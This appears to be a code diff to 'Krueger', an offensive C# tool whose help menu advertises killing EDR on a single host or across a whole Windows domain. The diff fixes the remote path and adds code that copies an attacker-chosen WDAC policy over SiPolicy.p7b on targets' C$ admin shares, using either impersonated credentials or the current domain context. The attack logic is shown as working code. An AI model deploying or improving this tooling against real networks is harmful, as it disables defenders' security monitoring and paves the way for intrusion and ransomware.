@@ -19,8 +19,8 @@ namespace Krueger.Modules
                 "\t-h/--help                -     Display this help menu\n" +
                 "\t--domain                 -     Kill EDR across the domain\n" +
                 "\t--host <hostname>        -     Kill EDR on a specified host\n" +
-                "\t-u <user>                -     User to authenticate as\n" +
-                "\t-p <password>            -     Password for authenticating user\n" +
+                "\t--username <user>        -     User to authenticate as\n" +
+                "\t--password <password>    -     Password for authenticating user\n" +
                 "\t--policy <policy file>   -     WDAC compiled policy to apply on the target(s)\n";
 
             Console.WriteLine(help);
@@ -113,15 +113,25 @@ namespace Krueger.Modules
                                 WindowsIdentity identity = new WindowsIdentity(token);
                                 WindowsImpersonationContext context = identity.Impersonate();
                             
-                                string target = @"\\" + host + @"C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
+                                string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
 
                                 File.Copy(policy, target, true);
+                                Console.WriteLine("[+] Moved policy successfully");
+                                context.Undo();
                             }
                             else
                             {
                                 Console.WriteLine("[!] You must specify both a username and password");
                             }
                         }
+                        else
+                        {
+                            Domain d = Domain.GetCurrentDomain();
+                            string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
+                            File.Copy(policy, target, true);
+                            Console.WriteLine("[+] Moved policy successfully");
+                        }
+
                     }
                     else
                     {
